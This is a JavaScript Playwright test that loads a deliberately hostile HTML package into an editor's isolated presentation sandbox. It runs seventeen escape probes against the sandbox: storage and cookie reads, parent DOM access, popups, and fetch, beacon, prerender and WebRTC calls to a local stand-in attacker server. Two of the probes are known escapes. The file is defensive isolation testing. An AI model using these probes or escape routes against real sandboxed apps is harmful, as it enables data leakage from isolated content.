// V1.3 verify: INDEPENDENT hostile package (my own probes, not A1's battery).
// Confirms editor data/UI unreachable; only prerender+webrtc escape. Full Chromium.
const fs=require('node:fs'),path=require('node:path');
const {chromium}=require('playwright'); const L=require('./lib-a1-copy.cjs');
const E='http://localhost:4661', WS='ws://localhost:4661', UDP_IP='127.0.0.1', UDP_PORT=4663;
const html=`<!doctype html><html><body><h1>iso</h1><script>
window.__p={};const T=(k,f)=>{try{const v=f();if(v&&v.then){return v.then(x=>window.__p[k]='RESOLVED:'+String(x).slice(0,40)).catch(e=>window.__p[k]='rej:'+(e.name||e))}window.__p[k]='VAL:'+String(v).slice(0,40)}catch(e){window.__p[k]='throw:'+(e.name||e.message||e).slice(0,50)}};
// 1 native localStorage (should be shimmed, not editor's)
T('1_localStorage_native',()=>{localStorage.setItem('x','y');return 'len='+localStorage.length});
// 2 IndexedDB qft-markdown (editor db)
T('2_indexedDB_qft',()=>new Promise((res,rej)=>{const r=indexedDB.open('qft-markdown');r.onsuccess=()=>res('opened v'+r.result.version+' stores='+[...r.result.objectStoreNames].join(','));r.onerror=()=>rej(r.error||'err');r.onupgradeneeded=()=>res('upgradeneeded(new)')}));
// 3 cookies
T('3_cookie',()=>{document.cookie='a=1';return JSON.stringify(document.cookie)});
// 4 top DOM read
T('4_top_dom',()=>top.document.body.innerHTML.length);
// 5 parent DOM read
T('5_parent_dom',()=>parent.document.title);
// 6 top navigation
T('6_top_nav',()=>{top.location.href='${E}/topnav';return 'set'});
// 7 window.open popup
T('7_window_open',()=>{const w=window.open('${E}/popup','_blank');return 'opened='+(!!w)});
// 8 alert dialog
T('8_alert',()=>{alert('hi');return 'returned'});
// 9 fetch external
T('9_fetch',()=>fetch('${E}/fetch').then(r=>'status'+r.status));
// 10 XHR external
T('10_xhr',()=>new Promise((res,rej)=>{const x=new XMLHttpRequest();x.open('GET','${E}/xhr');x.onload=()=>res('xhr'+x.status);x.onerror=()=>rej('xhrerr');x.send()}));
// 11 WebSocket
T('11_ws',()=>new Promise((res,rej)=>{const w=new WebSocket('${WS}/ws');w.onopen=()=>res('open');w.onerror=()=>rej('wserr')}));
// 12 external img
T('12_img',()=>new Promise((res)=>{const i=new Image();i.onload=()=>res('loaded');i.onerror=()=>res('imgerr');i.src='${E}/img.png'}));
// 13 external stylesheet link
T('13_css_link',()=>{const l=document.createElement('link');l.rel='stylesheet';l.href='${E}/s.css';document.head.append(l);return 'appended'});
// 14 external font via @font-face + style
T('14_font',()=>{const s=document.createElement('style');s.textContent='@font-face{font-family:x;src:url(${E}/f.woff2)}body{font-family:x}';document.head.append(s);return 'appended'});
// 15 beacon
T('15_beacon',()=>'sent='+navigator.sendBeacon('${E}/beacon','d'));
// --- the two known escapes, as positive controls ---
T('16_prerender',()=>{const l=document.createElement('link');l.rel='prerender';l.href='${E}/ESCAPE-prerender';document.head.append(l);return 'appended'});
T('17_webrtc',()=>{const pc=new RTCPeerConnection({iceServers:[{urls:'stun:${UDP_IP}:${UDP_PORT}'}]});pc.createDataChannel('c');pc.createOffer().then(o=>pc.setLocalDescription(o));return 'started'});
setTimeout(()=>{window.__done=true},2500);
</script></body></html>`;
(async()=>{
 const site=await L.startSite(4660); const evil=await L.startEvil(4661); const udp=await L.startUdp(UDP_PORT);
 const out={}; let browser;
 try{
  browser=await chromium.launch({channel:'chromium'});
  const page=await (await browser.newContext()).newPage();
  const dialogs=[]; page.on('dialog',async d=>{dialogs.push(d.message());await d.dismiss()});
  const topnav=[]; page.on('framenavigated',f=>{if(f===page.mainFrame())topnav.push(f.url())});
  const popups=[]; page.on('popup',p=>popups.push(p.url()));
  await L.openWorkspace(page,'http://127.0.0.1:4660/');
  await L.openFile(page,L.makePackage(html),'iso.zip');
  await page.locator('[data-pres-start-button]').waitFor({state:'visible',timeout:15000});
  await page.locator('[data-pres-start-button]').click();
  await L.sleep(4000);
  const frame=L.appFrame(page); const s=await L.dialogState(page);
  out.hostStatus=s.status; out.notice=s.notice;
  out.probes=frame?await frame.evaluate(()=>window.__p).catch(()=>'no-frame'):'no-frame';
  out.attackerHTTP=evil.log.map(e=>`${e.method} ${e.url}`);
  out.stunDatagrams=udp.log.length;
  out.dialogs=dialogs; out.topNavigations=topnav.filter(u=>!u.includes('127.0.0.1:4660')&&u!=='about:blank'); out.popups=popups;
  out.editorDraftIntact=await page.evaluate(()=>!!document.querySelector('.cm-editor'));
 } finally { await browser.close(); await Promise.all([site.close(),evil.close(),udp.close()]); fs.writeFileSync(path.join(__dirname,'logs','v-isolation.json'),JSON.stringify(out,null,2)); }
 console.log(JSON.stringify(out,null,1));
})().catch(e=>{console.error(e);process.exit(1)});
